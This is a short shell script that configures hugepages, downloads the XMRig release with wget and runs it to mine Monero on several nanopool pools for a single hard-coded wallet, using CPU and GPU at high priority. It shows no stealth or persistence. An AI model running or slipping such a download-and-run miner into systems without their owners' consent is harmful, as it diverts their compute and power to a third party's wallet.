sysctl -w vm.nr_hugepages=$(nproc)

for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
done

echo "1GB pages successfully enabled"

wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz && tar -xzvf xmrig-6.18.1-linux-static-x64.tar.gz && cd xmrig-6.18.1
./xmrig --opencl --cuda -o xmr-au1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-jp1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-asia1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-us-west1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-us-east1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-eu2.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero -o xmr-eu1.nanopool.org:14433 -u 47AVPthbhc56yMh2A7Cewh7jUGieQgtxKXAUWckPPBqJeUgSx8i2XNDDWdbT7uG5zUQixx4wp7zC9ZoebxLvyazCVFYpfVg --tls --coin monero 	--cpu-priority=5 --asm=auto --randomx-1gb-pages -randomx-cache-qos --cpu-no-yield
